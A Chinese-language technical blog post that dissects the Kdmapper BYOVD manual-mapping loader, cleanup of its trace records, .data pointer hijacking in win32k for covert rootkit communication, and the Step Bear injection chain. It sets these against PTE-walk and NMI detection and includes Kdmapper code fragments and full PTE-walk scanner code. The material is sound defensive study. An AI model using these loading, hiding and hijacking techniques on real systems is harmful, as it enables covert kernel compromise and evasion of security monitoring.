---
layout: post
title: "Kdmapper 与无模块驱动检测讲透：PTE Walk、NMI 采样与 win32k 通信攻防"
categories: essay
---

## 一、先立靶子：什么是"无模块驱动"

一个驱动按正规流程加载时，会在系统里留下完整的"户籍"：I/O 管理器调用加载器把它登记进系统模块名单（内核里那张 **PsLoadedModuleList** 链表，每个条目是一个 KLDR 条目，记着基址、大小、路径）；同时生成 DRIVER_OBJECT（驱动对象，它的调度表里挂着这个驱动的各个入口）；代码完整性组件还会把这次加载记进自己的历史账本。

**无模块驱动**指的是反面：**代码实实在在躺在内核内存里跑着，但所有官方名册上都查无此人**——不在模块名单里、没有正经的驱动对象、加载账本里也没有它。做到这一点的方法叫**手动映射（manual mapping）**：不走系统加载器，自己在内核内存里找块地，把驱动文件的 PE 结构手动铺开（拷贝节、修重定位、解导入），然后直接跳到它的入口点执行。整个过程加载器毫不知情。

名册查不到，常规的"枚举模块找可疑驱动"就全瞎了。于是检测必须换思路，全文就三条：

- **查地皮**：不查名册，直接清点内核内存里实际存在的可执行页，减去合法模块占的，剩下的就是无主代码（PTE Walk）；
- **查现行**：代码只要在跑，某一瞬间必然在某个 CPU 上执行；把那一瞬间冻住，看 CPU 正在执行的地址属于谁（NMI 采样）；
- **查动静**：驱动要干活就得与用户态通信，通信方式本身会露出马脚（.data ptr 劫持与它的检测）。

攻方的样本，就是大名鼎鼎的 Kdmapper。

## 二、Kdmapper 讲透

### 2.1 它凭什么能绕过签名：漏洞驱动是一把验过签的万能钥匙

Windows x64 有**驱动签名强制（DSE）**：驱动被加载时，代码完整性组件（CI）要验它的签名，没签名或签名不对就拒收。但要注意这道关卡的位置——**它只守"加载"这一刻**。代码一旦进了内核内存，CI 并不会持续盯着每一页是谁、从哪来。

Kdmapper 的立足点是一个 Intel 的设备诊断驱动（`iqvw64e.sys`，合法签名、能正常通过验签加载），它存在漏洞，对外提供的接口可以**任意读写内核任意地址**。这类"自带合法签名、却给攻击者递刀子"的驱动，业界叫 **BYOVD（Bring Your Own Vulnerable Driver，自带脆弱驱动）**。Kdmapper 的流程因此是：

1. 以管理员权限把 Intel 漏洞驱动当普通驱动加载进来（它有签名，DSE 放行）；
2. 通过它的任意读写原语，在内核里为所欲为——此时攻击者已经"人在内核里"了，后面全是手工活，再不需要加载器配合。

附带的一个关键原语是**借道执行任意内核函数**（kdmapper 的 `CallKernelFunction`）：它把系统调用 `NtAddAtom` 在内核里的入口临时改成跳板，用户态再正常发起一次 NtAddAtom 系统调用，执行流进内核后就被引到攻击者指定的任意内核函数上、以指定参数运行、再原路返回。也就是说，除了读写内存，还能"以正规姿势调用内核函数"——分配内存、改页属性这些活都靠它完成。执行流转交代清楚：这是一次普通的系统调用陷阱进入内核（int/系统调用指令进内核、陷阱帧保存现场），只不过入口地址处的第一跳被换了目标，最后仍按陷阱帧恢复返回用户态。

### 2.2 手动映射五步

拿到原语后，`kdmapper::MapDriver` 干的事，本质和用户态的"反射式 DLL 注入"是同一套，只是战场在内核：

1. **分配内存**：在内核里申请一块与镜像等大的内存。两种模式：默认走池分配（NonPagedPool）；另一个模式 `AllocateIndependentPages` 用 `MmAllocateIndependentPagesEx` 分配独立页，特意避免映射进大页（原因见第五节的检测对照：大页与小页在页表里的形态不同，独立页更"干净"、也更好单独设属性）；
2. **本地拉伸 PE**：在用户态先把驱动文件按 PE 格式铺开——按节对齐拷贝、处理重定位（把镜像里写死的地址按实际基址修正）、解析导入表（要调用的每个内核 API，都通过读原语去已加载模块的导出表里查出真实地址填好）；
3. **写入内核**：用写原语把拉伸好的镜像整份搬进第 1 步的内核内存（可选抹掉 PE 头，让内存里连文件头都不剩）；
4. **设置页属性**：逐节把页保护改成与节属性一致——代码节可读可执行、数据节可读写（`MmSetPageProtection`，同样靠借道调用完成）；
5. **调用入口**：用借道执行直接调用这份镜像的 DriverEntry（有个小把戏：可把分配基址作为第一个参数传进去，方便被映射的驱动自知身在何处）。DriverEntry 一跑，这个驱动就"活"了——但它在 PsLoadedModuleList 里没有条目、没有 I/O 管理器给的 DRIVER_OBJECT（入口拿到的参数是伪造的，很多这类 rootkit 干脆不用驱动对象、不用设备名，自建通信），户籍全空。这就是第一节定义的无模块驱动的诞生过程。

### 2.3 痕迹与擦除：system_trace_tool 擦的是另外一本账

映射本身不留加载记录，但**漏洞驱动是正规加载进来的**，它来过这件事被三处账本记着——这是事后取证抓 BYOVD 的主战场：

- **PiDDBCacheTable**：CI 维护的驱动加载历史缓存，记着驱动名、时间戳等。驱动哪怕已经卸载，这条记录还在；反作弊只要查到黑名单里的漏洞驱动名出现过，就知道这台机器被人开过后门；
- **MmUnloadedDrivers**（含 MmLastUnloadedDriver）：内核维护的"最近卸载的驱动"环形记录，卸载不是销号，只是转进这本流水账；
- **g_KernelHashBucketList**：CI 的文件哈希缓存，加载时算过的文件哈希按桶存着，同样能证明某驱动存在过。

Kdmapper 自带把这三处（以及 PiDDB 的锁、WdFilter 名单等）逐一抹掉的清理代码。**system_trace_tool** 就是把这部分清理逻辑摘出来做成的独立工具：GitHub 用户 FiYHer 的仓库（2021 年，仓库自述"内核驱动加载/卸载痕迹清理，努力绕过反作弊吧"），专职定位并删除 PiDDBCacheTable、MmUnloadedDrivers、g_KernelHashBucketList 等结构中的条目。

它和本篇的检测主题恰好是攻防两端、要分清：**system_trace_tool 抹的是"驱动消失之后"的历史痕迹**（防的是事后取证）；而 PTE Walk 与 NMI 抓的是"**此刻正在运行**的无模块代码"（查的是现行）。一个管身后事，一个管抓现行。

## 三、检测一：PTE Walk——不查名册，查地皮

思路极朴素：内核虚拟地址空间有上百 TB，逐页线性扫描慢到不可用；物理内存扫描则要面对"不连续、同一物理页多处映射"的烂摊子。但**页表本身就是一份现成的地皮登记册**——凡是真被映射了的页，页表里必然有它的一条记录；没被映射的虚空，页表项的 **present 位**（该页是否真实驻留）为 0，整片整片地不存在。

所以 PTE Walk 就是**像 CPU 一样亲手走一遍四级页表**：从 CR3 拿到 PML4 的物理地址、映射成可读地址，逐项往下走 PDPT、PD、PT，每一步先看 present 位：

- 某条 PML4E 不 present → 它管辖的 512GB 区间整片跳过，一个判断剪掉半个 TB 级空间；
- PDPT 层遇到大页位（large_page）置位的 1GB 大页、PD 层遇到 2MB 大页 → 不再下钻，整块按大页登记；
- 走到 PT 层，每条 present 的 PTE 登记一个 4KB 页。

登记时顺手记下属性，重点是**可执行**（noExecute 位为 0）：把所有"present 且可执行"的页合并成区间集合，再减去合法模块清单占的区间（模块的基址与大小从系统模块信息获取），**差集就是无模块可执行代码的地盘**——Kdmapper 用池或独立页映射进来的那份镜像，正躺在差集里。随后对差集页面做内容扫描（特征、字符串、PE 残迹）即可定罪。

为什么快：真实驻留内存不过几十 GB 量级，页表树绝大部分枝杈是空的，剪枝后实际访问的页表项数量很小。原文实测：全内核空间扫完**不超过一秒**，并给出了映射前后的扫描对比图，Kdmapper 新出现的可执行区间被当场点亮。

盲区也要讲清：它只能看见"页表里还挂着的页"。若对方把代码寄生进合法模块内部的空隙执行（业界叫 **模块踩踏，module stomping**——借合法模块的壳，地址落在模块区间内），差集法就会漏掉；代码页平时改成不可执行、用时才翻属性，也能降低被抓的概率。

## 四、检测二：NMI 采样——冻住 CPU，看它正在跑谁的代码

### 4.1 为什么偏偏是 NMI

PTE Walk 抓的是"住在哪"，NMI 抓的是"正在干什么"。逻辑支点只有一句：**无模块代码只要运行，那一瞬间某个 CPU 的指令指针（RIP）就正指着它**。如果能让所有 CPU 在同一时期被"定格"一下、逐个验明 RIP 的归属，正在活动的 rootkit 线程就无所遁形。

定格手段为什么选 **NMI（Non-Maskable Interrupt，不可屏蔽中断）**，要把中断的规矩讲清：普通中断受两道闸管制——CPU 标志里的 IF 位可以整体关中断，IRQL（中断请求级别）机制又让低优先级中断在高 IRQL 代码运行时排队等待。内核 rootkit 的线程可能正跑在高 IRQL 或关中断区段，普通中断、IPI、DPC、APC 这类手段都可能投递不进去或被推迟。**NMI 不归这两道闸管**：它在 x86 上固定走 **2 号向量**，CPU 收到后无条件停下当前指令流——不管 IF 是什么、IRQL 多高。这就是它的不可替代性。

投递链路（执行流转交代）：检测方先用 `KeRegisterNmiCallback` 注册自己的回调；再用 `HalSendNMI` 按处理器亲和性**逐个核心**发送——该调用经本地 APIC 以 NMI 投递模式发出处理器间中断；目标 CPU 一收到，硬件立刻把当前 RIP、CS、RFLAGS、RSP、SS 压到一张**专属异常栈**上（由 IDT 第 2 项里登记的 IST 索引指定，实测为 **IST3**——每核 TSS 里预备的第 3 号独立栈，专为这类"当前栈不可信也不能用"的场合而设），然后经 IDT 第 2 项跳进内核的 NMI 总入口，再依次调用注册过的回调。整个转移是**中断向量投递 + 换专用栈 + 借用被冻线程的执行流**，回调返回后按压栈的机器帧恢复，被冻的线程浑然不觉地继续跑。

原文实现里的两个细节值得学：一是**逐核发送、每发一核延时约 100ms**——同一时刻只能处理一个 NMI，且必须确认上一核的回调跑完；二是**采集与分析分离**——回调运行在 NMI 上下文里，连普通内核函数都不能随便调用（见 4.2），只许做"抄数据"这一件事，把 RIP/RSP 抄进预先备好的缓冲区就返回，繁重的比对分析留到事后在正常 IRQL 下做。

### 4.2 取帧的正确姿势：看雪那帖纠正的正是这件事

被冻住那一刻的 RIP 在哪？硬件已经替你压好了：压在 IST 异常栈顶的那组寄存器就叫 **MACHINE_FRAME（机器帧）**，其中 RIP、RSP 一应俱全。取它的路径是纯粹的内存读取，一次函数调用都不需要：

1. 读 MSR `IA32_GS_BASE` 拿到当前核的 **KPCR**（每核私有控制区，内核在每颗 CPU 上各放一份，GS 段基址就指着它）；
2. KPCR 偏移 0x8 处取出本核的 **TSS**（任务状态段，x64 下日常调度已不用它，但它保存着各 IST 异常栈的栈顶地址）；
3. 取 TSS 里的 **Ist3** 栈顶，减去一个 MACHINE_FRAME 的大小，就是机器帧的位置，直接读出 RIP 与 RSP。

**为什么不能图省事在回调里调 `RtlWalkFrameChain` 或 `RtlCaptureStackBackTrace` 做栈回溯？** 这正是看雪帖《[原创]使用 NMI 中断检测无模块驱动》（作者周旋久，2025 年 9 月）的立论起点，帖子开篇就批评了包括某些竞赛题解在内的流行写法：x64 下这两个函数要沿栈走帧，就必须解析每个返回地址所在函数的 **UNWIND_INFO**（PE 文件里记录"如何展开栈帧"的元数据）；而 NMI 是在任意时刻、任意上下文冻住 CPU 的，被冻代码完全可能正处在页表或内存状态微妙的瞬间，回溯途中一旦踩到不在物理内存中的页触发**缺页（Page Fault）**，在 NMI 上下文里这个缺页没有被正常处理的机会——直接蓝屏。机器帧路线全程只是读几个固定位置的内存，不解析、不回溯、不缺页，所以才稳。先知原文的 NMI 回调代码用的正是这条 KPCR→TSS→Ist3→机器帧的链，并注明是参考周旋久的方法。（如实说明：看雪原帖正文需回复后可见，本节关于该帖的内容以其公开可见的引子部分与先知文的转述实现互相印证；帖内截图细节未能逐一读取。）

### 4.3 判定与盲区

拿到 RIP 后判定很简单：取出系统模块清单（每个模块的 ImageBase 与 ImageSize 构成区间表），RIP 落入任一合法模块区间 → 放行；**不落入任何区间 → 正在执行的是一段无模块代码**，判定为 rootkit（原文代码里还注明不检查 HAL 与 PatchGuard 自身的运行区间）。进阶做法是再顺着 RSP 在栈上做有限扫描、找其他返回地址逐个验属，但受 4.2 的约束，栈上深挖同样不许用回溯 API，只能按机器帧与原始栈数据谨慎进行。

盲区同样明显，原文自己就点了：**这是概率采样**。NMI 是一瞬间的事，rootkit 线程必须"相对活跃"、恰好在采样瞬间正在某核上执行才会被逮住——对游戏外挂类需要高频与游戏进程交互的 rootkit 很管用；对那种平时沉睡、偶尔被触发一下的，会大量漏检。攻防的另一面（业界同类研究，如 eversinc33 的 unKover 系列所载）：栈欺骗（伪造栈内容）与模块踩踏都能削弱它，所以实战中 NMI 采样从不单独用，而是与 PTE Walk 这种"地皮清查"互为印证。

## 五、检测三的战场：通信面——.data ptr 劫持与 StepBear

### 5.1 rootkit 为什么需要通信，官方通道为什么危险

一个内核 rootkit 要接收用户态同伙的指令（杀进程、读内存、连 C2），必须有通信通道。官方通道是 IRP/`NtDeviceIoControl`：建设备、发 IOCTL。但这条明道正是 EDR 与反作弊的重点监控对象（原文作者的上一篇就讲了用 ETW 挂钩系统调用监控它；BYOVD 强杀 EDR 的攻击也多走合法驱动的 IRP 通道，行为特征明显）。

### 5.2 .data ptr 劫持：不改代码，只换一个指针

**数据指针劫持**的思路是：不碰任何一行代码，只替换某个 .data 段里存放的**函数指针**。为什么换指针比改代码安全？PatchGuard 对代码完整性盯得极严，但系统里函数指针数以万计、且许多本就会在运行时合法变动，PG 也只能抽查少数关键指针——原文检测一节把话说得很直白：连 PatchGuard 自己都做不到全量监控函数指针。

重灾区是 **win32k 家族**（win32k.sys / win32kbase.sys / win32kfull.sys，Windows 的图形与窗口子系统的内核部分）：它原是用户态实现、后来整体搬进内核，历史包袱重，留下了大量"用户态能直接触发、顺着指针就进内核执行"的入口。原文的完整打法：

1. win32kbase 加载在**会话空间**、映射在 GUI 进程里，所以要先 `KeStackAttachProcess` 挂靠到 winlogon.exe 的上下文中，才摸得到它的地址；
2. 从**导出**函数 `NtUserCreateWindowStation` 入手，往下找它调用的未导出函数 `ApiSetEditionCreateWindowStationEntryPoint`，用特征码 `48 8B 05 ?? ?? ?? ?? 48 85 C0`（一条"从某全局地址加载指针、再判空"的指令）定位其中读取函数指针的位置，反推出那个 .data 指针的地址；
3. 用 `_InterlockedExchangePointer` 把指针原子地换成自己的函数（原子交换是为了不留半写状态）；
4. 用户态同伙把命令写进一块共享内存，然后像没事人一样调用 `CreateWindowStationA` 这个正常 GUI API——执行流顺着被换的指针拐进 rootkit 的函数，读共享内存执行命令、回写结果。整个过程：没有设备、没有 IOCTL、rootkit 也不需要常驻一个活跃线程等活——**顺带天然躲开了 NMI 采样**（原文明确点出这个设计意图）。

### 5.3 StepBear：先把身份摆正

先知原文在讲 win32k 时顺带提了一句"奇安信披露的 StepBear 技术就是在这个驱动中"，这句话需要展开纠偏，否则极易误读：

**Step Bear（或 StepBear）不是工具、不是驱动、更不是检测技术**——它是**奇安信威胁情报中心 2024 年 4 月披露并命名的一项 APT 内核态注入技术**，使用者是 Storm-0978（即 RomCom，俄语背景的攻击组织），报告标题就叫《EDR 的梦魇》。它与本篇主题的交集只有一处：**同样把 win32k 当作突破口**。其链条大致是：

1. 用"Hell's Gate（地狱之门）"手法在 ntdll 里动态解析系统调用号、**直接发系统调用** `NtUserSetClassLong`，绕开 EDR 在用户态 API 上布的钩子；
2. 借这个 win32k 系统调用，把含一小段跳转代码（gadget）的 shellcode 写进某个**窗口类的额外类内存（tagCLS 结构里）**——这块内存由 win32k 管理；
3. win32k 的机制会把这块类内存映射进**记事本（notepad.exe）**的地址空间（只读），代码就这样"合法地"出现在目标进程里，完成第一跳；
4. 再仿照思路借 **RPC 调用链**做执行流劫持：在 RPC 服务端分发路径（`NdrServerCallAll` 一带）劫持 `Ndr64pFreeParams` 的执行，先跑 gadget 把那段小 shellcode 改成可读写执行（RWX），再正式执行它；
5. 同样手法打进浏览器进程，最后通过向一个未公开的 COM 隐藏窗口发送**自定义消息 0x405** 触发浏览器侧的 RPC 链，加载恶意浏览器插件（CRX）收尾。

所以定性是：**Kdmapper/.data ptr 解决的是"驱动怎么进来、怎么通信"，Step Bear 解决的是"用户态载荷怎么借 win32k 与系统机制跨进程注入"**，两者共用的是 win32k 这块攻击面，仅此而已。2024 年底已有公开复现项目（GitHub: huoji120/APT_Step_Bear_Inject）。

### 5.4 检测的困境

对 .data ptr 劫持，理论上的完美防御是监控所有易受攻击驱动里的全部函数指针、定时验真——原文结论是这**几乎不可行**：指针太多、版本差异太大，杀软与反作弊都没有这个精力，PG 也做不到。现实中的反作弊做法是行为侧的：**盯住那些被劫持后会异常高频出现的 GUI 调用**（比如正常程序一辈子调不了几次的 CreateWindowStation 突然被频繁调用），顺藤摸瓜查到对应内核函数，再验它用的 .data 指针有没有指向模块之外的地址——出界即篡改；验出一个就把这个指针位置做成特征，纳入盯防名单。这仍然是猫鼠游戏：攻方只需换一个冷门指针，就能让名单失效一阵子。

## 六、总览：四条线如何咬合

| 攻方动作 | 留下的破绽 | 对应检测 |
|---|---|---|
| 漏洞驱动正规加载（Kdmapper 的前提） | PiDDBCacheTable、MmUnloadedDrivers、哈希缓存里的历史记录 | 事后取证查账本（system_trace_tool 是反着把账本擦掉的工具） |
| 手动映射、无模块常驻 | 页表里存在不属于任何模块的可执行页 | PTE Walk 清点地皮、做差集 |
| rootkit 线程实际运行 | 某瞬间某核的 RIP 指向无模块地址 | NMI 全核采样、验 RIP 归属 |
| 隐蔽通信（.data ptr 劫持） | 被换的指针出界、GUI 调用频率异常 | 行为监控 + 指针验真（全量监控不可行） |
| 借 win32k 跨进程注入（Step Bear） | tagCLS 类内存被写、异常的系统调用与 RPC 链 | EDR 的 win32k 行为监控（攻防仍在演进） |

一句话收束：**名册（模块列表）是最容易伪造的东西，所以现代内核检测一路从"查名册"退到"查地皮、查现行、查动静"**；而攻方的每一次进化（擦账本、沉睡线程、换指针通信），都是在把某一条检测线的性价比打下去。这正是这篇先知文章把攻与防放在一起讲的价值。

## 七、出处与核查说明

- 底本：先知社区《从 Kdmapper 到高级 Rootkit 检测：PTE Walk 与 NMI 在反 Rootkit 中的应用》，https://xz.aliyun.com/news/18995（正文与代码逐节实读；该站页面抓取时有段落重复渲染，本文按唯一内容计）。
- 看雪 thread-288576《[原创]使用 NMI 中断检测无模块驱动》（周旋久，2025-09）：正文需回复可见，本文采用其公开引子与先知文转述实现互相印证的写法，未读到的截图细节不臆测。
- system_trace_tool：GitHub 仓库 FiYHer/system_trace_tool（2021），按仓库自述核。
- Step Bear：奇安信威胁情报中心《EDR 的梦魇：Storm-0978 使用新型内核注入技术"Step Bear"》（2024-04）及公开复现仓库核对后定性。

---

## 附：原文全文

> 以下为先知社区原文《从 Kdmapper 到高级 Rootkit 检测：PTE Walk 与 NMI 在反 Rootkit 中的应用》全文转载，便于对照阅读；版权归原作者所有。原文地址：https://xz.aliyun.com/news/18995（原站页面个别段落在抓取时重复出现，此处按唯一内容整理。）

### 前言

内核Rootkit以其高权限、高隐蔽性而著称，而传统的防御手段效率过于低下，不适合实战攻防。本文从内核Rootkit攻击的原理出发，剖析了著名的 Kdmapper 手动映射驱动项目，再从内存扫描、堆栈遥测、通信检测三个角度提出了较为先进的防御手段，帮助读者理解现代内核安全领域的攻防实践手法。

### KdMapper

Kdmapper 可能是最有名的内核Rootkit项目，利用了早些年intel驱动中的任意内核地址读写漏洞实现了手动将驱动映射至内核地址空间中执行，绕过了Windows的驱动签名验证。

项目源码中的核心功能函数是 kdmapper::MapDriver ，首先分配内存:

```cpp
ULONG64 kernel_image_base = 0;
if (mode == AllocationMode::AllocateIndependentPages)
{   // 这个模式是防止分配出大页内存
    kernel_image_base = intel_driver::MmAllocateIndependentPagesEx(image_size);
}
else { // AllocatePool by default
    kernel_image_base = intel_driver::AllocatePool(nt::POOL_TYPE::NonPagedPool, image_size);
}
```

接着是解析PE结构、重定位等工作，与DLL的反射加载类似，这里就不贴了。然后将拉伸映射好的PE内存写入内核：

```cpp
// Write fixed image to kernel
if (!intel_driver::WriteMemory(realBase, (PVOID)((uintptr_t)local_image_base + (destroyHeader ? TotalVirtualHeaderSize : 0)), image_size)) {
    Log(L"[-] Failed to write local image to remote image" << std::endl);
    kernel_image_base = realBase;
    break;
}
```

设置页属性为可执行：

```cpp
if (!intel_driver::MmSetPageProtection(secAddr, secSize, prot)) {
    Log(L"[-] Failed to set protection for section: " << (char*)sec->Name << std::endl);
}
```

接着调用DriverEntry：

```cpp
NTSTATUS status = 0;
if (!intel_driver::CallKernelFunction(&status, address_of_entry_point, (PassAllocationAddressAsFirstParam ? realBase : param1), param2)) {
    Log(L"[-] Failed to call driver entry" << std::endl);
    kernel_image_base = realBase;
    break;
}
```

这里的 CallKernelFunction 实现比较有意思，Hook了 NtAddAtom 函数，jump到自己的DriverEntry执行

核心功能点如上； Kdmapper 项目还抹除了 PiDDBCacheTable 、 g_KernelHashBucketList 、 MmUnloadedDrivers 中漏洞驱动的加载痕迹，在驱动加载这方面几乎没法检测了，有一个项目从 Kdmapper 中专门摘出了这一部分，做的很优秀：FiYHer/system_trace_tool: 内核驱动加载/卸载痕迹清理,努力绕过反作弊吧 PiDDBCacheTable and MmLastUnloadedDriver（github.com）

Kdmapper 只是一个引子，有大量的内核Rootkit使用了类似 Kdmapper 的加载方式，利用的漏洞驱动也百花齐放。最近几年，在传统内存检测的基础上，页表扫描的方法被提出；插中断扫描堆栈的方法也对Rootkit线程捕获很有效果。下面我将从这几个方面出发，让rootkit无所遁形。

### PTE Walk

以往的内存扫描有两种，分别是扫描线性地址或物理地址。这两种方法的缺陷都是很大的，比如如下的扫描线性地址伪代码：

```cpp
NTSTATUS
CheckVirtualAddress()
{
    ULONG64 start = 0xFFFF080000000000;
    ULONG64 end   = 0xFFFFFFFFFFFFFFFF;
    for(ULONG idx = 0;start + idx*PAGE_SIZE < end;idx++){
        // 按页检查Rookit
        CheckPage(start+idx*PAGE_SIZE);
    }
}
```

整个内核的地址空间有248TB，像这样逐页扫描的耗时是相当恐怖的，完全不能使用；扫描物理地址就更不用说，因为物理地址是不连续的，且同一个物理地址映射到多个虚拟地址，处理起来很麻烦。

因此，一种基于页表的新扫描办法被提出，称其为 PTE Walk ，我们来看看X64下的页表结构：

![](https://xzfile.aliyuncs.com/media/upload/picture/20250925110615-99471b5c-99bc-1.png)

X64下采用了四级页表的结构，从高到低分别是PML4,PDPT,PD,PT，每一个页表的页表项结构基本一样，如下：

```c
typedef union _HARDWARE_PTE_X64 {
    ULONG64 value;
    struct {
        ULONG64 present : 1;            // bit 0
        ULONG64 write : 1;              // bit 1
        ULONG64 owner : 1;
        ULONG64 writeThrough : 1;
        ULONG64 cacheDisable : 1;
        ULONG64 accessed : 1;
        ULONG64 dirty : 1;
        ULONG64 large_page : 1;         // bit 7
        ULONG64 global : 1;
        ULONG64 copyOnWrite : 1;
        ULONG64 prototype : 1;
        ULONG64 reserved0 : 1;
        ULONG64 page_frame_number : 36; // bits 12..47
        ULONG64 reserved1 : 4;
        ULONG64 softwareWsIndex : 11;
        ULONG64 noExecute : 1;          // bit 63
    } Bits;
} HARDWARE_PTE_X64, * PHARDWARE_PTE_X64;
```

其中有一些很关键的位，比如 present 表示页表项管理的这一页是否在**物理地址**中有映射， write 表示是否可写， noExecute 表示是否可执行， large_page 表示是否为大页。通常来说一页是 0x1000 字节大小，由PTE管理；而大页可能是 2M 或者 1G 大小，由PDE或PDPTE管理。

通过判断页表**是否为大页以及是否有效**，我们可以跳过大部分无效的页，专注于少量真正被映射的页。（为什么说是少量？因为真实的物理内存远远小于248TB）来看看如下代码：

```c
static VOID WalkAndPrint(void)
{
    DbgPrintEx(77, 0, "[Walk] enter, Range=[%p, %p)\n", (PVOID)gScanStart, (PVOID)gScanEnd);
    // 通过CR3拿到PML4的表基地址
    CR3_X64 temp_cr3;
    temp_cr3.value = __readcr3();
    ULONGLONG cr3_pa = (temp_cr3.Bits.PhysicalAddress << 12);
    PVOID cr3_va = VaFromPa(cr3_pa);// 映射为线性地址，进行线性扫描
    if (!cr3_va || !MmIsAddressValid(cr3_va)) {
        DbgPrintEx(77, 0, "[Walk][FATAL] VaFromPa(CR3=0x%llX) -> %p invalid\n", cr3_pa, cr3_va);
        return;
    }
    DbgPrintEx(77, 0, "[Walk] CR3.PA=0x%llX -> CR3.VA=%p\n", cr3_pa, cr3_va);
    ULONGLONG runBase = 0, runSize = 0;
    PAGE_PROPERTIES runProps = { 0 };
    // 算出起始、结束地址对应的PML4索引，即Bit[39...47]
    ULONG pml4_start = (ULONG)((gScanStart >> 39) & 0x1FF);
    ULONG pml4_end = (ULONG)(((gScanEnd - 1) >> 39) & 0x1FF);
    // 从PML4开始，像操作系统解析线性地址那样，手动解析地址进行扫描
    for (ULONG i = pml4_start; i <= pml4_end; ++i)
    {
        PHARDWARE_PTE_X64 pml4e = (PHARDWARE_PTE_X64)((PUCHAR)cr3_va + i * sizeof(ULONG64));
        // 通过判断Present位迅速跳过无效页，极大加快扫描速度
        if (!MmIsAddressValid(pml4e) || !pml4e->Bits.present) {
            continue;
        }
        // PDPT
        ULONGLONG pdpt_pa = ((ULONGLONG)pml4e->Bits.page_frame_number << 12);
        PVOID pdpt_va = VaFromPa(pdpt_pa);
        // 同上
        if (!pdpt_va || !MmIsAddressValid(pdpt_va)) {
            continue;
        }
        ULONG pdpt_start = (ULONG)((gScanStart >> 30) & 0x1FF);
        ULONG pdpt_end = (ULONG)(((gScanEnd - 1) >> 30) & 0x1FF);
        if (i != pml4_start) pdpt_start = 0;
        if (i != pml4_end)   pdpt_end = 511;
        for (ULONG x = pdpt_start; x <= pdpt_end; ++x)
        {
            PHARDWARE_PTE_X64 pdpte = (PHARDWARE_PTE_X64)((PUCHAR)pdpt_va + x * sizeof(ULONG64));
            if (!MmIsAddressValid(pdpte))
                break;
            ULONGLONG pdpt_va_base = Canonicalize48(((ULONGLONG)i << 39) | ((ULONGLONG)x << 30));
            ULONGLONG pdpt_va_end = pdpt_va_base + SPAN_PDPT;
            if (pdpt_va_end <= gScanStart || pdpt_va_base >= gScanEnd)
                continue;
            if (!pdpte->Bits.present)
                continue;
            // 处理1GB大页
            if (pdpte->Bits.large_page) {
                PAGE_PROPERTIES props;
                props.R = (BOOLEAN)pdpte->Bits.present;
                props.W = (BOOLEAN)pdpte->Bits.write;
                props.X = (BOOLEAN)!pdpte->Bits.noExecute;
                ULONGLONG segBeg = UMAX64(pdpt_va_base, gScanStart);
                ULONGLONG segEnd = UMIN64(pdpt_va_end, gScanEnd);
                AddRange(segBeg, segEnd - segBeg, &props, &runBase, &runSize, &runProps);
                continue;
            }
            // PD
            ULONGLONG pd_pa = ((ULONGLONG)pdpte->Bits.page_frame_number << 12);
            PVOID pd_va = VaFromPa(pd_pa);
            if (!pd_va || !MmIsAddressValid(pd_va)) {
                continue;
            }
            ULONG pd_start = (ULONG)((gScanStart >> 21) & 0x1FF);
            ULONG pd_end = (ULONG)(((gScanEnd - 1) >> 21) & 0x1FF);
            if (i != pml4_start || x != pdpt_start) pd_start = 0;
            if (i != pml4_end || x != pdpt_end)   pd_end = 511;
            for (ULONG y = pd_start; y <= pd_end; ++y)
            {
                PHARDWARE_PTE_X64 pde = (PHARDWARE_PTE_X64)((PUCHAR)pd_va + y * sizeof(ULONG64));
                if (!MmIsAddressValid(pde))
                    break;
                ULONGLONG pd_va_base = Canonicalize48(((ULONGLONG)i << 39) |
                                                      ((ULONGLONG)x << 30) |
                                                      ((ULONGLONG)y << 21));
                ULONGLONG pd_va_end = pd_va_base + SPAN_PD;
                if (pd_va_end <= gScanStart || pd_va_base >= gScanEnd)
                    continue;
                if (!pde->Bits.present)
                    continue;
                // 处理2MB大页
                if (pde->Bits.large_page) {
                    PAGE_PROPERTIES props;
                    props.R = (BOOLEAN)pde->Bits.present;
                    props.W = (BOOLEAN)pde->Bits.write;
                    props.X = (BOOLEAN)!pde->Bits.noExecute;
                    ULONGLONG segBeg = UMAX64(pd_va_base, gScanStart);
                    ULONGLONG segEnd = UMIN64(pd_va_end, gScanEnd);
                    AddRange(segBeg, segEnd - segBeg, &props, &runBase, &runSize, &runProps);
                    continue;
                }
                // PT
                ULONGLONG pt_pa = ((ULONGLONG)pde->Bits.page_frame_number << 12);
                PVOID pt_va = VaFromPa(pt_pa);
                if (!pt_va || !MmIsAddressValid(pt_va)) {
                    continue;
                }
                ULONG pt_start = (ULONG)((gScanStart >> 12) & 0x1FF);
                ULONG pt_end = (ULONG)(((gScanEnd - 1) >> 12) & 0x1FF);
                if (i != pml4_start || x != pdpt_start || y != pd_start) pt_start = 0;
                if (i != pml4_end || x != pdpt_end || y != pd_end)   pt_end = 511;
                for (ULONG z = pt_start; z <= pt_end; ++z)
                {
                    PHARDWARE_PTE_X64 pte = (PHARDWARE_PTE_X64)((PUCHAR)pt_va + z * sizeof(ULONG64));
                    if (!MmIsAddressValid(pte))
                        break;
                    ULONGLONG va = Canonicalize48(((ULONGLONG)i << 39) |
                                                  ((ULONGLONG)x << 30) |
                                                  ((ULONGLONG)y << 21) |
                                                  ((ULONGLONG)z << 12));
                    if (va + SPAN_PT <= gScanStart) continue;
                    if (va >= gScanEnd) break;
                    // 处理正常的4KB小页
                    if (pte->Bits.present) {
                        PAGE_PROPERTIES props;
                        props.R = (BOOLEAN)pte->Bits.present;
                        props.W = (BOOLEAN)pte->Bits.write;
                        props.X = (BOOLEAN)!pte->Bits.noExecute;
                        AddRange(va, SPAN_PT, &props, &runBase, &runSize, &runProps);
                    }
                }
            }
        }
    }
    EmitRun(runBase, runSize, &runProps);
    DbgPrintEx(77, 0, "[Walk] leave\n");
}
```

测试如下，我分别在使用 kdmapper 手动映射驱动前、后进行了扫描；首先看看驱动被映射的位置

![](https://xzfile.aliyuncs.com/media/upload/picture/20250925110615-9998945a-99bc-1.png)

再看看扫描的结果对比：

![](https://xzfile.aliyuncs.com/media/upload/picture/20250925110616-99cb291a-99bc-1.png)

显然 kdmapper 分配内存然后映射驱动这一特征点被我们捕捉到了，此时杀毒/反作弊对可执行页进一步扫描，则可以检测到Rookit，或者提取其特征。更重要的是，这一方法扫描整个内核空间耗时不超过一秒，是一种相当高校、准确的Anti-Rootkit方法。

### NMI

现在再来看看扫描Rootkit的另一类思想：中断。这种思想通过向CPU的各核心发送中断，打断正在执行的线程并对其堆栈合法性进行检查。对于 kdmapper 加载的这种rootkit来说，其堆栈中的返回地址一定不在合法模块内（模块踩踏除外），利用这一点可以捕捉到内核中正在执行的rootkit线程。

